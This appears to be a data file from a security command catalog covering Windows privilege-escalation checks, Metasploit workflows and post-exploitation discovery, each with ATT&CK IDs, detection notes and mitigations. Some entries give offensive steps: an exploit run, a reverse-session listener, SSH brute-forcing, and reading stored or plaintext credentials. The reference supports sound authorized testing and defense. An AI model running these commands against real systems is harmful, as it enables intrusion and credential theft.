 {"id":"pe-alwaysinstallelevated","level":"advanced","updated":"2026-07","cat":"Privilege-Escalation Enumeration","title":"Check AlwaysInstallElevated policy","desc":"Test whether MSI packages install as SYSTEM (both HKLM and HKCU keys set to 1) — a direct escalation path.","team":"red","tags":["privesc","enumeration","registry"],"attack":["T1548"],"detect":"Reads of the Installer policy keys, then an msiexec launch of a user-supplied .msi running as SYSTEM — flag msiexec spawning shells.","mitigate":"Never enable AlwaysInstallElevated via GPO; if set, remove both HKLM and HKCU values; restrict who can run installers.","danger":"Read-only enumeration of policy state. Authorized use only.","code":{"ps":"Get-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue\nGet-ItemProperty 'HKCU:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue","cmd":"reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul"}},
 {"id":"pe-stored-creds-windows","level":"advanced","updated":"2026-07","cat":"Privilege-Escalation Enumeration","title":"Windows stored credentials & autologon","desc":"List saved Credential Manager entries and check the registry for a plaintext autologon password.","team":"red","tags":["privesc","enumeration","password"],"attack":["T1552.002","T1555.004"],"detect":"'cmdkey /list' plus reads of the Winlogon key; alert on DefaultPassword reads and on runas /savecred usage of stored blobs.","mitigate":"Avoid autologon/DefaultPassword; clear stale cmdkey entries; use LAPS and gMSA; store secrets in a managed vault.","danger":"Read-only, but reveals credentials. Authorized use only.","code":{"ps":"cmdkey /list\nGet-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' |\n  Select-Object DefaultUserName, DefaultDomainName, DefaultPassword, AutoAdminLogon","cmd":"cmdkey /list\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword 2>nul\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v AutoAdminLogon 2>nul"}},
 {"id":"pe-scheduled-tasks","level":"advanced","updated":"2026-07","cat":"Privilege-Escalation Enumeration","title":"Enumerate scheduled tasks & run-as","desc":"List scheduled tasks and the accounts they run as to find tasks executing writable binaries as SYSTEM.","team":"red","tags":["privesc","enumeration","scheduling"],"attack":["T1053.005"],"detect":"'schtasks /query /v' or Get-ScheduledTask enumeration; the escalation signal is a task's action binary/dir being modifiable by a low-priv user.","mitigate":"Ensure task action binaries are in protected, non-writable paths; run tasks with least privilege; audit task creation (Event ID 4698).","danger":"Read-only enumeration. Authorized use only.","code":{"ps":"Get-ScheduledTask | Where-Object State -ne 'Disabled' |\n  ForEach-Object { [pscustomobject]@{ Name=$_.TaskName; Path=$_.TaskPath; RunAs=$_.Principal.UserId; Action=($_.Actions.Execute -join ';') } } |\n  Format-Table -AutoSize","cmd":"schtasks /query /fo LIST /v | findstr /i \"TaskName Run:As Task To Run\""}},

/* ================= EXPLOITATION FRAMEWORKS ================= */
 {"id":"exp-msfconsole-launch","level":"advanced","requires":{"tool":"msfconsole"},"cat":"Exploitation Frameworks","title":"Launch the Metasploit console","desc":"Start msfconsole (Metasploit Framework); -q suppresses the banner for scripting.","danger":"Authorized use only. Metasploit is offensive tooling; run it against systems you own or have written permission to test.","tags":["exploitation","tools","reference"],"code":{"linux":"# Interactive console\nmsfconsole\n\n# Quiet start (no banner), then show version\nmsfconsole -q -x 'version; exit'","mac":"# Installed via: brew install --cask metasploit\nmsfconsole -q"}},
 {"id":"exp-msfdb-init","level":"advanced","requires":{"elevation":true},"cat":"Exploitation Frameworks","title":"Initialize the Metasploit database","desc":"Set up the PostgreSQL-backed msf database so hosts, services, and loot persist across sessions.","danger":"Needs a running PostgreSQL service and appropriate privileges. Database stores scan results and captured credentials in plaintext-adjacent form; protect it.","tags":["exploitation","tools"],"code":{"linux":"# One-time database setup (Kali/Debian)\nsudo msfdb init\n\n# Check connection from inside msfconsole\nmsfconsole -q -x 'db_status; exit'"}},
 {"id":"exp-msf-workspace","level":"advanced","cat":"Exploitation Frameworks","title":"Organize engagements with workspaces","desc":"Separate hosts/services/loot per engagement using msfconsole workspaces.","tags":["exploitation","reference"],"code":{"linux":"# Run inside msfconsole:\nworkspace                       # list workspaces\nworkspace -a {{ENGAGEMENT:client-2026}}   # add and switch\nworkspace {{ENGAGEMENT:client-2026}}      # switch to it\nworkspace -d {{ENGAGEMENT:old-test}}      # delete one"}},
 {"id":"exp-msf-search","level":"advanced","cat":"Exploitation Frameworks","title":"Search for modules","desc":"Find exploit, auxiliary, and post modules by keyword, CVE, platform, or type inside msfconsole.","tags":["exploitation","recon","reference"],"code":{"linux":"# Run inside msfconsole:\nsearch type:auxiliary smb\nsearch cve:{{CVE:2021-34527}}\nsearch platform:windows type:exploit rank:excellent\nsearch name:{{KEYWORD:eternalblue}}\ninfo {{MODULE:auxiliary/scanner/smb/smb_version}}"}},
 {"id":"exp-msf-use-options","level":"advanced","cat":"Exploitation Frameworks","title":"Select a module and review options","desc":"Load a module with use, then inspect required settings with show options / info.","tags":["exploitation","reference"],"code":{"linux":"# Run inside msfconsole:\nuse {{MODULE:auxiliary/scanner/smb/smb_version}}\ninfo                 # description, references, options\nshow options         # required (yes) vs optional settings\nshow missing         # only the still-unset required options"}},
 {"id":"exp-msf-set-options","level":"advanced","cat":"Exploitation Frameworks","title":"Set module options","desc":"Assign target, threads, and other datastore values before running a module.","tags":["exploitation","reference"],"code":{"linux":"# Run inside the loaded module:\nset RHOSTS {{TARGET:10.0.0.0/24}}\nset RPORT {{PORT:445}}\nset THREADS 20\nunset RPORT          # revert one option to default\nsetg RHOSTS {{TARGET:10.0.0.0/24}}   # set globally for all modules"}},
 {"id":"exp-msf-check","level":"advanced","updated":"2026-07","cat":"Exploitation Frameworks","title":"Verify a target is vulnerable (check)","desc":"Use a module's check action to probe for a vulnerability without launching the exploit.","danger":"Authorized use only. check still sends crafted probes that can be logged, alerted on, or occasionally destabilize fragile services.","team":"red","attack":["T1210"],"detect":"IDS/WAF signatures fire on the anomalous protocol handshake or crafted request; application logs show malformed/unexpected input from a single source; unusual short-lived connections to the vulnerable service port.","mitigate":"Patch the underlying vulnerability, apply virtual patching / WAF rules, reduce external exposure of the service, and monitor for exploit-check signatures.","tags":["exploitation","scanning"],"code":{"linux":"# Run inside the loaded exploit module:\nset RHOSTS {{RHOST:10.0.0.5}}\ncheck                # reports Vulnerable / Safe / Unknown without exploiting"}},
 {"id":"exp-msf-run-exploit","level":"advanced","updated":"2026-07","cat":"Exploitation Frameworks","title":"Exploit workflow (use / set / check / run)","desc":"Generic module-run workflow: load a module, set target and listener, verify, then run — no specific CVE.","danger":"Authorized use only. Launching an exploit can crash services, corrupt data, and constitutes unauthorized access without explicit written permission. Supply your own {{MODULE}}.","team":"red","attack":["T1210"],"detect":"Suricata/Snort exploit-attempt rules (ET set); target service crash, restart, or unexpected child process; EDR alerts on memory injection or a new outbound reverse connection to the LHOST; spike in error logs immediately before a new session.","mitigate":"Patch aggressively, deploy EDR with memory-injection detection, segment networks, disable unused services, and enforce egress filtering so reverse callbacks fail.","tags":["exploitation","remote"],"code":{"linux":"# Run inside msfconsole (generic workflow, supply your own module):\nuse {{MODULE:exploit/path/to/module}}\nset RHOSTS {{RHOST:10.0.0.5}}\nset LHOST {{LHOST:10.0.0.10}}\nshow options\ncheck\nrun                  # 'exploit' is an alias for run\nexploit -j -z        # run as background job, do not interact"}},
 {"id":"exp-msf-auxiliary-scanner","level":"advanced","updated":"2026-07","cat":"Exploitation Frameworks","title":"Run an auxiliary scanner","desc":"Use auxiliary/scanner modules for port, service, and version discovery across a range.","danger":"Authorized use only. Scanning networks you do not own or lack permission to test may be illegal and is easily detected.","team":"red","attack":["T1046"],"detect":"Network sensors (Zeek conn.log, Suricata scan alerts) flag one source touching many ports/hosts in a short window; firewall/flow logs show fan-out connection attempts; honeypots record the probes.","mitigate":"Segment networks, rate-limit and log connection attempts, deploy IDS scan-detection, and minimize the externally reachable service surface.","tags":["exploitation","scanning","discovery"],"code":{"linux":"# Run inside msfconsole:\nuse auxiliary/scanner/portscan/tcp\nset RHOSTS {{TARGET:10.0.0.0/24}}\nset PORTS 1-1024\nset THREADS 20\nrun\n\n# Service-specific version scan example\nuse auxiliary/scanner/smb/smb_version\nset RHOSTS {{TARGET:10.0.0.0/24}}\nrun"}},
 {"id":"exp-msf-auxiliary-login","level":"advanced","updated":"2026-07","cat":"Exploitation Frameworks","title":"Auxiliary credential (login) scanners","desc":"Use auxiliary/scanner/*/*_login modules to test credentials against a service — authorized use only.","danger":"Authorized use only. Online credential guessing triggers lockouts, is noisy, and is unlawful without explicit written permission. Prefer provided credential lists over large wordlists.","team":"red","attack":["T1110.001","T1110.003"],"detect":"Authentication logs show many failed logins from one source, account lockouts, and rapid sequential attempts across usernames; SIEM brute-force correlation rules fire; service-specific auth failure spikes.","mitigate":"Enforce account lockout/backoff, MFA, strong unique passwords, network-level throttling (fail2ban), and alert on failed-auth thresholds.","tags":["exploitation","password"],"code":{"linux":"# Run inside msfconsole (example: SSH):\nuse auxiliary/scanner/ssh/ssh_login\nset RHOSTS {{TARGET:10.0.0.5}}\nset USER_FILE {{USERS:/path/users.txt}}\nset PASS_FILE {{PASS:/path/pass.txt}}\nset STOP_ON_SUCCESS true\nset VERBOSE false\nrun"}},
 {"id":"exp-msf-db-nmap","level":"advanced","updated":"2026-07","cat":"Exploitation Frameworks","title":"Import scans with db_nmap and db_import","desc":"Run Nmap from msfconsole so results land directly in the workspace database, or import an existing scan.","danger":"Authorized use only. db_nmap runs a real Nmap scan against the target; unauthorized scanning may be illegal.","team":"red","attack":["T1046"],"detect":"Same footprint as any Nmap scan — IDS scan alerts, connection fan-out in flow logs, and unusual SYN volume from one source.","mitigate":"IDS scan detection, network segmentation, and reducing exposed services; treat repeated scanning as reconnaissance and investigate.","tags":["exploitation","scanning","discovery"],"code":{"linux":"# Run inside msfconsole:\ndb_nmap -sV -T4 {{TARGET:10.0.0.0/24}}\n\n# Or import a scan produced elsewhere\ndb_import {{FILE:/path/scan.xml}}"}},
 {"id":"exp-msf-hosts-services","level":"advanced","cat":"Exploitation Frameworks","title":"Query hosts, services, and vulns from the database","desc":"Review discovered assets stored in the workspace with hosts, services, and vulns.","tags":["exploitation","enumeration","reference"],"code":{"linux":"# Run inside msfconsole:\nhosts                          # all discovered hosts\nhosts -c address,os_name,name  # selected columns\nservices -p 445                # everything listening on 445\nservices -u                    # only up services\nvulns                          # vulnerabilities mapped to hosts"}},
 {"id":"exp-msf-sessions","level":"advanced","updated":"2026-07","cat":"Exploitation Frameworks","title":"Manage active sessions","desc":"List, interact with, background, and kill open sessions from msfconsole.","danger":"Authorized use only. An active session is live access to a target; killing/backgrounding affects a real remote host.","team":"red","attack":["T1219"],"detect":"Long-lived or beaconing outbound connections to an operator LHOST; EDR flags in-memory session agents; unexpected reverse TCP/HTTPS to non-business destinations; new processes without a parent GUI/service.","mitigate":"Egress filtering and TLS inspection to break reverse callbacks, EDR with memory/behavior detection, application allowlisting, and network segmentation to limit reach.","tags":["exploitation","post-ex","remote"],"code":{"linux":"# Run inside msfconsole:\nsessions -l              # list active sessions\nsessions -i {{ID:1}}     # interact with a session\n# (inside a session, press Ctrl+Z or type: background)\nsessions -k {{ID:1}}     # kill a session\nsessions -K              # kill ALL sessions"}},
 {"id":"exp-msf-meterpreter-basics","level":"advanced","updated":"2026-07","cat":"Exploitation Frameworks","title":"Meterpreter enumeration basics","desc":"Read-only host enumeration from a Meterpreter session (sysinfo/getuid/ps) — no privilege escalation payloads.","danger":"Authorized use only. These commands run on a live compromised host; only operate within an approved engagement scope.","team":"red","attack":["T1082","T1057"],"detect":"Meterpreter has recognizable in-memory artifacts and named-pipe / API-call patterns; EDR and memory scanners (e.g. Volatility, YARA meterpreter rules) flag it; enumeration bursts (system info + process list) shortly after a new session appears.","mitigate":"EDR with in-memory detection, application allowlisting, least-privilege accounts, and egress filtering to cut the session's C2 channel.","tags":["post-ex","enumeration","exploitation"],"code":{"linux":"# Run inside a Meterpreter session:\nsysinfo          # OS, architecture, hostname\ngetuid           # current user context\ngetpid           # host process id\nps               # running processes\nipconfig         # interfaces and addresses\nbackground       # return to msfconsole, keep session"}},
 {"id":"exp-msf-post-modules","level":"advanced","updated":"2026-07","cat":"Exploitation Frameworks","title":"Run post-exploitation enumeration modules","desc":"Use post/ modules for read-only host recon (logged-on users, installed software, missing-patch suggester).","danger":"Authorized use only. Post modules act on a live session against a real host; keep to enumeration modules within scope.","team":"red","attack":["T1082","T1518"],"detect":"EDR/audit logs show enumeration activity (WMI/registry/API sweeps) originating from an anomalous process; a burst of recon shortly after session establishment; script/module artifacts written to temp paths.","mitigate":"EDR behavioral detection, PowerShell/script-block and process-creation logging, least privilege, and alerting on rapid host-recon sequences.","tags":["post-ex","enumeration","windows"],"code":{"linux":"# Run inside msfconsole with an active session:\nuse post/multi/recon/local_exploit_suggester\nset SESSION {{ID:1}}\nrun\n\nuse post/windows/gather/enum_logged_on_users\nset SESSION {{ID:1}}\nrun"}},
 {"id":"exp-msf-jobs-handler","level":"advanced","updated":"2026-07","cat":"Exploitation Frameworks","title":"Background jobs and multi/handler listener","desc":"Start a generic listener as a background job and manage running jobs with jobs.","danger":"Authorized use only. A handler opens a listening socket to receive incoming sessions; only run within an approved engagement.","team":"red","attack":["T1071","T1571"],"detect":"Host listening on an unexpected/non-standard port; inbound connections from internal hosts to an operator system; NetFlow shows a new persistent listener and matching reverse connections.","mitigate":"Ingress/egress filtering, host firewall allowlists, and alerting on new listening ports or connections to non-standard ports.","tags":["exploitation","remote","post-ex"],"code":{"linux":"# Run inside msfconsole:\nuse exploit/multi/handler\nset LHOST {{LHOST:10.0.0.10}}\nset LPORT {{LPORT:4444}}\nexploit -j            # run as background job\n\njobs -l               # list running jobs\njobs -k {{JOBID:0}}   # kill a job"}},
 {"id":"exp-msf-resource-script","level":"advanced","requires":{"tool":"msfconsole"},"cat":"Exploitation Frameworks","title":"Automate with resource scripts","desc":"Batch msfconsole commands into an .rc resource script and replay them with -r or resource.","danger":"Authorized use only. Resource scripts can chain scans and exploits unattended; review before running and keep within scope.","tags":["exploitation","automation","scheduling"],"code":{"linux":"# setup.rc contains one msfconsole command per line, e.g.:\n#   workspace -a {{ENGAGEMENT:client}}\n#   db_nmap -sV {{TARGET:10.0.0.0/24}}\n#   hosts\n\n# From a shell:\nmsfconsole -q -r {{FILE:setup.rc}}\n\n# Or from inside msfconsole:\nresource {{FILE:setup.rc}}"}},
 {"id":"exp-searchsploit-search","level":"advanced","requires":{"tool":"searchsploit"},"cat":"Exploitation Frameworks","title":"Look up public exploits with searchsploit","desc":"Query the offline Exploit-DB copy (exploitdb package / searchsploit) by product, version, or CVE.","danger":"Authorized use only. searchsploit is a research lookup; using the referenced exploits against systems without permission is illegal.","tags":["exploitation","recon","reference"],"code":{"linux":"# exploitdb package (preinstalled on Kali)\nsearchsploit {{PRODUCT:apache 2.4}}\nsearchsploit --cve {{CVE:2021-41773}}\nsearchsploit -t {{TERM:samba}}       # title-only search\nsearchsploit -w {{PRODUCT:openssh}}  # include Exploit-DB URLs","mac":"# Installed via: brew install exploitdb\nsearchsploit {{PRODUCT:apache 2.4}}"}},
 {"id":"exp-searchsploit-examine","level":"advanced","requires":{"tool":"searchsploit"},"cat":"Exploitation Frameworks","title":"Read and copy a searchsploit entry","desc":"Examine an Exploit-DB entry's source with -x and copy it to the working directory with -m.","danger":"Authorized use only. Copied exploit code is for authorized testing and study; never run untrusted exploit code against production or third-party systems.","tags":["exploitation","reference"],"code":{"linux":"searchsploit -p {{ID:50383}}   # show the file path and metadata\nsearchsploit -x {{ID:50383}}   # view the exploit source in a pager\nsearchsploit -m {{ID:50383}}   # mirror (copy) it into the current directory","mac":"searchsploit -m {{ID:50383}}"}},
 {"id":"exp-msf-update","level":"advanced","requires":{"elevation":true},"cat":"Exploitation Frameworks","title":"Update Metasploit and Exploit-DB","desc":"Refresh the framework and the searchsploit database to pull the latest modules and entries.","danger":"Requires network access and package privileges. Only update from official repositories.","tags":["exploitation","tools","package-manager"],"code":{"linux":"# Kali/Debian: update via the package manager\nsudo apt update && sudo apt install --only-upgrade metasploit-framework\n\n# Update the offline Exploit-DB copy\nsudo searchsploit -u","mac":"# Framework was installed as a cask (brew install --cask metasploit)\nbrew update && brew upgrade --cask metasploit\n\n# Update the offline Exploit-DB copy (exploitdb formula)\nsearchsploit -u"}},
 {"id":"exp-cobaltstrike-detect","level":"advanced","updated":"2026-07","cat":"Exploitation Frameworks","title":"Cobalt Strike (catalog and detection)","desc":"Commercial adversary-simulation C2; commonly abused. Catalog and detection only — no payloads here.","danger":"Cobalt Strike is a licensed red-team C2 platform and one of the most abused tools by real intruders. Study its indicators for defense; do not deploy without a license and authorization.","team":"red","attack":["T1071.001","T1573"],"detect":"Default/known JARM and JA3/JA3S TLS fingerprints; named pipes matching default patterns (e.g. \\\\.\\pipe\\msagent_*, postex_*); beacon jitter/sleep regularity in NetFlow; malleable-C2 profile artifacts in HTTP headers/URIs; memory scanners and Sigma/Suricata Cobalt Strike rules. Practice detection on a lab, not production.","mitigate":"TLS inspection with JARM/JA3 fingerprinting, EDR with beacon and named-pipe detection, egress filtering, and blocking known C2 infrastructure via threat intel.","tags":["exploitation","post-ex","detection"],"code":{"linux":"# No operational commands published here.\n# Learn detection safely in a lab environment:\n#   https://www.cobaltstrike.com/  (official)\n#   Detection practice: https://tryhackme.com  /  https://www.hackthebox.com\necho 'Study Cobalt Strike indicators: JARM/JA3, named pipes, beacon timing.'"}},
 {"id":"exp-sliver-detect","level":"advanced","updated":"2026-07","cat":"Exploitation Frameworks","title":"Sliver C2 (catalog and detection)","desc":"Open-source cross-platform adversary-emulation C2 framework. Catalog and detection only.","danger":"Sliver is a legitimate red-team C2 that is increasingly abused in real intrusions. Understand its indicators; only operate it under explicit authorization.","team":"red","attack":["T1071","T1573.002"],"detect":"Default mTLS certificate patterns and JARM fingerprints; unusual DNS-over-HTTPS or long TXT-record DNS C2 volume; WireGuard/mTLS beaconing to non-business hosts; implant artifacts flagged by EDR and YARA community rules.","mitigate":"Egress and DNS monitoring/filtering, JARM/mTLS fingerprinting at the perimeter, EDR behavioral detection, and blocking anomalous outbound encrypted channels.","tags":["exploitation","post-ex","detection"],"code":{"linux":"# No operational commands published here.\n# Study detection in an isolated lab:\n#   Official: https://github.com/BishopFox/sliver\n#   Labs: https://www.hackthebox.com  /  https://tryhackme.com\necho 'Study Sliver indicators: default certs, JARM, DNS/mTLS beaconing.'"}},
 {"id":"exp-beef-detect","level":"advanced","updated":"2026-07","cat":"Exploitation Frameworks","title":"BeEF browser exploitation (catalog and detection)","desc":"Browser Exploitation Framework that hooks browsers via injected JavaScript. Catalog and detection only.","danger":"Authorized use only. BeEF hooks victim browsers and is for approved social-engineering/web assessments in a lab or sanctioned test.","team":"red","attack":["T1185","T1059.007"],"detect":"Requests for hook.js and periodic XHR/polling back to a BeEF server appear in web-proxy and browser logs; injected script tags on pages that should not carry them; regular beacon intervals from a browser to an unfamiliar host.","mitigate":"Strict Content-Security-Policy, subresource integrity, output encoding to prevent XSS injection points, egress filtering, and proxy alerts on hook.js / known BeEF URIs.","tags":["exploitation","web","detection"],"code":{"linux":"# No operational commands published here.\n# Learn the hook/detection flow in a lab:\n#   Official: https://github.com/beefproject/beef\n#   Labs: https://tryhackme.com  /  https://www.hackthebox.com\necho 'Detect BeEF: hook.js requests and periodic browser XHR beaconing.'"}},

/* ================= POST-EXPLOITATION ================= */
 {"id":"post-situational-awareness","level":"advanced","updated":"2026-07","related":["post-account-discovery","post-share-discovery","post-process-secsoftware-discovery"],"cat":"Post-Exploitation","title":"Local situational awareness","desc":"First-move discovery a foothold runs: current user, host, and network config. Read-only.","danger":"Read-only, but the same commands attackers run post-compromise. Run only on systems you own or are authorized to assess.","team":"purple","tags":["discovery","enumeration","cross-platform","post-ex"],"attack":["T1082","T1033","T1016"],"detect":"EDR command-line telemetry showing whoami/hostname/ipconfig run in quick succession, especially by service or non-interactive accounts.","mitigate":"Baseline normal admin activity and alert on discovery-command bursts; enforce least privilege so a foothold sees little.","code":{"ps":"whoami /all\nhostname\nipconfig /all","cmd":"whoami /all & hostname & ipconfig /all","mac":"whoami; id; hostname\nifconfig | grep 'inet '\nsw_vers","linux":"whoami; id; hostname\nip -brief addr\nuname -a"}},
 {"id":"post-account-discovery","level":"advanced","updated":"2026-07","related":["post-domain-account-discovery","post-unsecured-credentials"],"cat":"Post-Exploitation","title":"Local account & group discovery","desc":"Enumerate local users and privileged group membership to map targets for escalation.","danger":"Read-only enumeration; authorized assessments only.","team":"purple","tags":["account","enumeration","discovery"],"attack":["T1087.001","T1069.001"],"detect":"Windows 4798 (local group membership enumerated) / 4799; repeated net.exe or dscl calls listing admin groups.","mitigate":"Minimize local admin membership; use LAPS for unique local passwords; alert on group-enumeration events.","code":{"ps":"Get-LocalUser\nGet-LocalGroupMember Administrators\nnet localgroup administrators","cmd":"net user\nnet localgroup administrators","mac":"dscl . -list /Users | grep -v '^_'\ndscl . -read /Groups/admin GroupMembership","linux":"getent passwd | cut -d: -f1\ngetent group sudo wheel"}},
 {"id":"post-domain-account-discovery","level":"advanced","updated":"2026-07","cat":"Post-Exploitation","title":"Domain account & group discovery","desc":"Enumerate domain users and high-value groups from a domain-joined host. Get-AD* needs RSAT.","danger":"Read-only, but heavy directory enumeration is a classic pre-lateral-movement signal. Authorized only.","team":"purple","tags":["active-directory","account","discovery","ldap"],"attack":["T1087.002","T1069.002"],"detect":"Security 4661/4662 directory-object access and high-volume LDAP queries from one host (BloodHound-style collection patterns).","mitigate":"Enable AD auditing; deploy honey-accounts; limit anonymous/broad LDAP reads; monitor for mass enumeration.","code":{"ps":"net user /domain\nnet group \"Domain Admins\" /domain\n# RSAT ActiveDirectory module:\nGet-ADGroupMember \"Domain Admins\" | Select-Object name","cmd":"net user /domain\nnet group \"Domain Admins\" /domain"}},
 {"id":"post-share-discovery","level":"advanced","updated":"2026-07","cat":"Post-Exploitation","title":"Network share discovery","desc":"Find reachable SMB/network shares to hunt for data and lateral paths. Linux uses smbclient (Samba); macOS uses built-in smbutil.","danger":"Touching remote shares generates access logs; only enumerate authorized hosts.","team":"purple","tags":["smb","discovery","network"],"attack":["T1135"],"detect":"Windows 5140/5145 (share accessed) spikes; SMB tree-connect bursts to many hosts from one source.","mitigate":"Remove unnecessary shares; restrict share ACLs; disable SMBv1; monitor east-west SMB.","code":{"ps":"net view \\\\{{HOST:fileserver}}\nGet-SmbShare\nnet share","cmd":"net view \\\\{{HOST:fileserver}}\nnet share","mac":"smbutil view //{{USER:guest}}@{{HOST:fileserver}}","linux":"smbclient -L //{{HOST:fileserver}} -N"}},
 {"id":"post-process-secsoftware-discovery","level":"advanced","updated":"2026-07","cat":"Post-Exploitation","title":"Process & security-software discovery","desc":"List running processes and installed AV/EDR so an operator can plan evasion. SecurityCenter2 is client-Windows only.","danger":"Read-only; enumerating defensive products is reconnaissance for evasion. Authorized only.","team":"purple","tags":["process","discovery","detection"],"attack":["T1057","T1518.001"],"detect":"Queries to WMI root/SecurityCenter2, tasklist/Get-Process filtering for AV/EDR names, or reads of vendor install paths.","mitigate":"Enable tamper protection so product state can't be read/changed; alert on SecurityCenter2 enumeration.","code":{"ps":"Get-Process | Sort-Object CPU -Descending | Select-Object -First 15\nGet-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct |\n  Select-Object displayName, productState","cmd":"tasklist /svc","mac":"ps -axo pid,user,%cpu,comm | head -20","linux":"ps -eo pid,user,%cpu,comm --sort=-%cpu | head -20"}},
 {"id":"post-lsass-credential-dump","requires":{"elevation":true,"os":"Windows"},"level":"advanced","updated":"2026-07","related":["post-pass-the-hash-ticket","post-dcsync"],"cat":"Post-Exploitation","title":"LSASS credential dumping (catalog + detect)","desc":"Concept only: attackers read LSASS memory for plaintext creds/hashes (Mimikatz, comsvcs.dll). Practice on HackTheBox/TryHackMe, not production. Hunt query below needs Sysmon.","danger":"No dumping command provided. Reading LSASS requires SYSTEM and exposes live credentials; authorized IR/red-team only.","team":"purple","tags":["memory","detection","windows","post-ex"],"attack":["T1003.001"],"detect":"Sysmon EID 10 process-access to lsass.exe with GrantedAccess 0x1010/0x1410/0x143a; Security 4656/4663 handle requests to lsass; comsvcs.dll MiniDump in command lines.","mitigate":"Enable LSA Protection (RunAsPPL), Credential Guard, and the ASR rule 'block credential stealing from lsass'; restrict debug privilege.","code":{"ps":"# Hunt Sysmon process-access to LSASS (requires Sysmon)\nGet-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';Id=10} -MaxEvents 300 |\n  Where-Object { $_.Message -match 'lsass' } |\n  Select-Object TimeCreated, Id -First 20"}},
 {"id":"post-sam-hive-theft","level":"advanced","updated":"2026-07","cat":"Post-Exploitation","title":"SAM/SECURITY hive theft (catalog + detect)","desc":"Concept: attackers copy SAM/SYSTEM/SECURITY hives (reg save, esentutl, shadow copy) to crack local hashes offline. Hunt via process-creation logs.","danger":"No extraction command provided; hive theft needs local admin. Authorized only.","team":"purple","tags":["registry","windows","detection"],"attack":["T1003.002"],"detect":"Process creation of reg.exe save / esentutl of SAM,SYSTEM,SECURITY; access to \\Device\\HarddiskVolumeShadowCopy; vssadmin create shadow.","mitigate":"Restrict local admin; enable Credential Guard (protects cached domain creds); monitor VSS creation and hive access.","code":{"ps":"# Hunt reg-hive theft via 4688 process creation (needs command-line auditing)\nGet-WinEvent -FilterHashtable @{LogName='Security';Id=4688} -MaxEvents 500 |\n  Where-Object { $_.Message -match 'reg.*save' -and $_.Message -match 'SAM|SYSTEM|SECURITY' }"}},
 {"id":"post-unsecured-credentials","level":"advanced","updated":"2026-07","cat":"Post-Exploitation","title":"Hunt unsecured credentials in files","desc":"Defensive sweep for plaintext secrets left in scripts/configs — the same data an operator harvests post-foothold.","danger":"Reads file contents; scope PATH and run only where authorized.","team":"purple","tags":["password","detection","cross-platform"],"attack":["T1552.001"],"detect":"Mass sequential file reads / recursive grep over home and config dirs; access to .env, id_rsa, unattend.xml, web.config.","mitigate":"Move secrets to a vault/secret manager; add pre-commit and repo secret scanning; remove plaintext creds; tighten config-file ACLs.","code":{"ps":"Get-ChildItem {{PATH:C:\\Users}} -Recurse -Include *.txt,*.ini,*.config,*.xml,*.ps1 -ErrorAction SilentlyContinue |\n  Select-String -Pattern 'password\\s*=|api[_-]?key|secret' | Select-Object -First 50","linux":"grep -rInE 'password[[:space:]]*=|api[_-]?key|secret|BEGIN [A-Z]* PRIVATE KEY' {{PATH:/home}} 2>/dev/null | head -50","mac":"grep -rInE 'password[[:space:]]*=|api[_-]?key|secret|BEGIN [A-Z]* PRIVATE KEY' {{PATH:/Users}} 2>/dev/null | head -50","py":"import os, re\npat = re.compile(r'password\\s*=|api[_-]?key|secret|PRIVATE KEY', re.I)\nfor dp, _, fs in os.walk(r'{{PATH:.}}'):\n    for f in fs:\n        p = os.path.join(dp, f)\n        try:\n            with open(p, errors='ignore') as fh:\n                for i, line in enumerate(fh, 1):\n                    if pat.search(line):\n                        print(f\"{p}:{i}: {line.strip()[:120]}\")\n        except OSError:\n            pass"}},
 {"id":"post-browser-vault-credentials","level":"advanced","updated":"2026-07","cat":"Post-Exploitation","title":"Browser & OS vault credential theft (catalog + detect)","desc":"Catalog: attackers pull saved logins from browser stores (Login Data, logins.json) and OS vaults (Credential Manager, Keychain). Below lists store locations to monitor.","danger":"Locating stores is benign; decrypting saved creds is offensive. Authorized only.","team":"purple","tags":["password","detection","cross-platform"],"attack":["T1555.003","T1555.001"],"detect":"Non-browser processes opening Login Data / logins.json / the login keychain; DPAPI blob access outside the owning app.","mitigate":"Discourage saving privileged creds in browsers; enable app-bound encryption; EDR file-access rules on credential stores.","code":{"ps":"cmdkey /list\nGet-ChildItem \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data\" -ErrorAction SilentlyContinue","mac":"ls -l ~/Library/Application\\ Support/Google/Chrome/Default/Login\\ Data 2>/dev/null\nsecurity list-keychains","linux":"ls -l ~/.config/google-chrome/Default/Login\\ Data ~/.mozilla/firefox/*/logins.json 2>/dev/null"}},
 {"id":"post-dcsync","level":"advanced","updated":"2026-07","cat":"Post-Exploitation","title":"DCSync replication abuse (catalog + detect)","desc":"Concept: an account with replication rights impersonates a DC to pull password hashes (incl. krbtgt). Detection query runs against a DC's Security log.","danger":"No attack command provided; requires Replicating Directory Changes rights. Authorized only.","team":"purple","tags":["active-directory","detection","windows"],"attack":["T1003.006"],"detect":"Security 4662 referencing replication GUID 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 (DS-Replication-Get-Changes) from a non-DC account or host.","mitigate":"Minimize accounts holding replication rights; protect tier-0; alert on replication from anything other than domain controllers.","code":{"ps":"# Run on a DC's Security log\nGet-WinEvent -FilterHashtable @{LogName='Security';Id=4662} -MaxEvents 500 |\n  Where-Object { $_.Message -match '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' }"}},
